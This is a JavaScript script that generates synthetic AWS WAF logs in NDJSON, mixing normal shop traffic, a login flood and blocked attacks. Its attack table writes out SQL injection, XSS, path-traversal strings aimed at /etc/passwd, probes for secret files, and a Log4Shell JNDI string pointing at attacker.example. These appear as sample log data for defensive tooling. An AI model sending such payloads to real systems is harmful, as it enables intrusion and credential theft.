// AWS WAF ログ形式 (https://docs.aws.amazon.com/waf/latest/developerguide/logging-fields.html) に
// 準拠した合成サンプルを NDJSON で生成する。決定的な乱数なので再生成しても同じ結果になる。
import { writeFileSync, mkdirSync } from 'node:fs'

let seed = 20261022
const rnd = () => {
  seed = (seed * 1664525 + 1013904223) >>> 0
  return seed / 2 ** 32
}
const pick = (a) => a[Math.floor(rnd() * a.length)]
const wpick = (pairs) => {
  const total = pairs.reduce((s, [, w]) => s + w, 0)
  let r = rnd() * total
  for (const [v, w] of pairs) if ((r -= w) <= 0) return v
  return pairs[0][0]
}
const hex = (n) => Array.from({ length: n }, () => Math.floor(rnd() * 16).toString(16)).join('')
const ip = (a, b) => `${a}.${b ?? Math.floor(rnd() * 256)}.${Math.floor(rnd() * 256)}.${1 + Math.floor(rnd() * 254)}`

const WEBACL = 'arn:aws:wafv2:ap-northeast-1:123456789012:regional/webacl/demo-web-acl/5f1c2a9e-8f7d-4c0b-9a55-0d2f6b7c1e11'
const SOURCES = [
  ['ALB', 'app/demo-alb/50dc6c495c0c9188', 5],
  ['CF', 'E2EXAMPLE1ABC', 3],
  ['APIGW', 'a1b2c3d4e5/prod', 1],
]
const UAS = {
  browser: [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0',
  ],
  tool: ['sqlmap/1.8.4#stable (https://sqlmap.org)', 'Nikto/2.5.0', 'curl/8.4.0', 'python-requests/2.31.0', 'Go-http-client/1.1', 'masscan/1.3'],
  bot: ['Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)'],
}
const COUNTRIES = [['JP', 50], ['US', 15], ['SG', 4], ['DE', 3], ['GB', 3], ['IN', 3]]
const ATTACK_COUNTRIES = [['CN', 25], ['RU', 20], ['US', 15], ['BR', 10], ['NL', 10], ['KR', 8], ['VN', 6], ['IN', 6]]

const NORMAL_PATHS = [
  ['/', 20], ['/index.html', 4], ['/products', 12], ['/products/1042', 8], ['/products/2231', 6], ['/cart', 6],
  ['/api/v1/items', 10], ['/api/v1/search', 8], ['/api/v1/users/me', 6], ['/login', 5], ['/static/app.js', 8],
  ['/static/style.css', 6], ['/favicon.ico', 4], ['/health', 5],
]
const ATTACKS = [
  { type: 'sqli', rule: 'SQLi_QUERYARGUMENTS', group: 'AWS-AWSManagedRulesSQLiRuleSet', uri: '/api/v1/search', args: () => `q=${pick(["1' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT username,password FROM users--", "admin'--"])}`, loc: 'QUERY_STRING', label: 'awswaf:managed:aws:sql-database:SQLi_QueryArguments' },
  { type: 'xss', rule: 'CrossSiteScripting_QUERYARGUMENTS', group: 'AWS-AWSManagedRulesCommonRuleSet', uri: '/products', args: () => `name=${pick(['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', '<svg/onload=alert(document.cookie)>'])}`, loc: 'QUERY_STRING', label: 'awswaf:managed:aws:core-rule-set:CrossSiteScripting_QueryArguments' },
  { type: 'lfi', rule: 'GenericLFI_QUERYARGUMENTS', group: 'AWS-AWSManagedRulesCommonRuleSet', uri: '/download', args: () => `file=${pick(['../../../../etc/passwd', '..%2f..%2f..%2fwindows/win.ini', '/proc/self/environ'])}`, loc: 'QUERY_STRING', label: 'awswaf:managed:aws:core-rule-set:GenericLFI_QueryArguments' },
  { type: 'scan', rule: 'UserAgent_BadBots_HEADER', group: 'AWS-AWSManagedRulesCommonRuleSet', uri: () => pick(['/wp-login.php', '/.env', '/phpmyadmin/', '/admin', '/.git/config', '/xmlrpc.php', '/actuator/env', '/server-status']), args: () => '', loc: 'HEADER', label: 'awswaf:managed:aws:core-rule-set:UserAgent_BadBots_Header' },
  { type: 'ipbad', rule: 'AWSManagedIPReputationList', group: 'AWS-AWSManagedRulesAmazonIpReputationList', uri: '/login', args: () => '', loc: 'IP', label: 'awswaf:managed:aws:amazon-ip-list:AWSManagedIPReputationList' },
  { type: 'log4j', rule: 'Log4JRCE_HEADER', group: 'AWS-AWSManagedRulesKnownBadInputsRuleSet', uri: '/', args: () => '', loc: 'HEADER', label: 'awswaf:managed:aws:known-bad-inputs:Log4JRCE_Header' },
]

// 攻撃元は固定の少数IPに偏らせる (現実のログに近い分布)
const attackers = Array.from({ length: 40 }, () => ({
  ip: ip(pick([45, 61, 89, 103, 138, 185, 194, 218])),
  country: wpick(ATTACK_COUNTRIES),
  kind: pick(ATTACKS),
  weight: 0.2 + rnd() ** 2 * 3,
}))
const floodIp = { ip: '203.0.113.77', country: 'VN' }
const clients = Array.from({ length: 600 }, () => ({ ip: ip(pick([27, 60, 110, 126, 133, 153, 160, 203, 18, 52])), country: wpick(COUNTRIES) }))

const end = Date.UTC(2026, 9, 22, 0, 0, 0)
const start = end - 7 * 86400_000
const hourWeight = (h) => 0.35 + 0.65 * Math.max(0, Math.sin(((h - 3) / 24) * Math.PI * 2 - Math.PI / 2) * -1 + 0.4) // JST昼寄り

function sourceOf() {
  const [name, id] = wpick(SOURCES.map(([n, i, w]) => [[n, i], w]))
  return { httpSourceName: name, httpSourceId: id }
}

function headers(host, ua, extra = []) {
  return [{ name: 'Host', value: host }, { name: 'User-Agent', value: ua }, { name: 'Accept', value: '*/*' }, ...extra]
}

function build(ts, who, mode, attack) {
  const src = sourceOf()
  const host = 'shop.example.com'
  const base = {
    timestamp: ts,
    formatVersion: 1,
    webaclId: WEBACL,
    terminatingRuleId: 'Default_Action',
    terminatingRuleType: 'REGULAR',
    action: 'ALLOW',
    terminatingRuleMatchDetails: [],
    httpSourceName: src.httpSourceName,
    httpSourceId: src.httpSourceId,
    ruleGroupList: [],
    rateBasedRuleList: [],
    nonTerminatingMatchingRules: [],
    requestHeadersInserted: null,
    responseCodeSent: null,
    labels: [],
    httpRequest: {
      clientIp: who.ip,
      country: who.country,
      headers: [],
      uri: '/',
      args: '',
      httpVersion: pick(['HTTP/1.1', 'HTTP/2.0', 'HTTP/2.0']),
      httpMethod: 'GET',
      requestId: `1-${hex(8)}-${hex(24)}`,
    },
  }
  const r = base.httpRequest
  if (mode === 'normal') {
    r.uri = wpick(NORMAL_PATHS)
    r.httpMethod = r.uri.startsWith('/api') || r.uri === '/login' ? wpick([['GET', 6], ['POST', 4]]) : 'GET'
    if (r.uri === '/api/v1/search') r.args = `q=${pick(['shoes', 'tシャツ', 'laptop', 'coffee'])}`
    r.headers = headers(host, pick(rnd() < 0.08 ? UAS.bot : UAS.browser))
    return base
  }
  if (mode === 'flood') {
    r.uri = '/login'
    r.httpMethod = 'POST'
    r.headers = headers(host, pick(UAS.tool))
    const blocked = rnd() < 0.85
    if (blocked) {
      base.action = 'BLOCK'
      base.terminatingRuleId = 'RateLimit-Login-100per5min'
      base.terminatingRuleType = 'RATE_BASED'
      base.responseCodeSent = 429
    }
    base.rateBasedRuleList = [{ rateBasedRuleId: 'RateLimit-Login-100per5min', rateBasedRuleName: 'RateLimit-Login-100per5min', limitKey: 'IP', maxRateAllowed: 100, limitValue: who.ip }]
    return base
  }
  // attack
  const a = attack
  r.uri = typeof a.uri === 'function' ? a.uri() : a.uri
  r.args = a.args()
  r.httpMethod = a.type === 'ipbad' ? 'POST' : 'GET'
  const ua = a.type === 'log4j' ? '${jndi:ldap://' + hex(6) + '.attacker.example/a}' : a.type === 'scan' || a.type === 'sqli' ? pick(UAS.tool) : pick([...UAS.browser, ...UAS.tool])
  r.headers = headers(host, ua)
  // 一部は COUNT (検知のみ) / 一部は通過 (ルール調整漏れ)
  const roll = rnd()
  const action = roll < 0.82 ? 'BLOCK' : roll < 0.93 ? 'COUNT' : 'ALLOW'
  base.labels = [{ name: a.label }]
  const detail = [{ conditionType: a.type === 'sqli' ? 'SQL_INJECTION' : 'XSS', sensitivityLevel: 'HIGH', location: a.loc, matchedData: ['REDACTED'] }]
  if (action === 'BLOCK') {
    base.action = 'BLOCK'
    base.terminatingRuleId = a.group
    base.terminatingRuleType = 'MANAGED_RULE_GROUP'
    base.terminatingRuleMatchDetails = a.type === 'sqli' || a.type === 'xss' ? detail : []
    base.responseCodeSent = null
    base.ruleGroupList = [{ ruleGroupId: a.group, terminatingRule: { ruleId: a.rule, action: 'BLOCK', ruleMatchDetails: null }, nonTerminatingMatchingRules: [], excludedRules: null }]
  } else if (action === 'COUNT') {
    base.nonTerminatingMatchingRules = [{ ruleId: a.rule, action: 'COUNT', ruleMatchDetails: [], captchaResponse: null, challengeResponse: null }]
  }
  return base
}

const N = 30000
const events = []
for (let i = 0; i < N; i++) {
  const t = start + rnd() * (end - start)
  const jst = new Date(t + 9 * 3600_000).getUTCHours()
  if (rnd() > hourWeight(jst)) { i--; continue }
  const roll = rnd()
  if (roll < 0.84) events.push([t, 'normal', wpick(clients.map((c) => [c, 1])), null])
  else if (roll < 0.97) {
    const a = wpick(attackers.map((x) => [x, x.weight]))
    events.push([t, 'attack', a, a.kind])
  } else events.push([t, 'flood', floodIp, null])
}
// 4日目の夜に rate-based の大量攻撃バーストを入れる
const burstStart = start + (3 * 24 + 13) * 3600_000
for (let i = 0; i < 1800; i++) events.push([burstStart + rnd() * 25 * 60_000, 'flood', floodIp, null])
events.sort((a, b) => a[0] - b[0])

mkdirSync(new URL('../public/sample/', import.meta.url), { recursive: true })
const out = events.map(([t, mode, who, atk]) => JSON.stringify(build(Math.floor(t), who, mode, atk))).join('\n') + '\n'
writeFileSync(new URL('../public/sample/waf-sample.ndjson', import.meta.url), out)
console.log(`generated ${events.length} events, ${(out.length / 1e6).toFixed(1)} MB`)
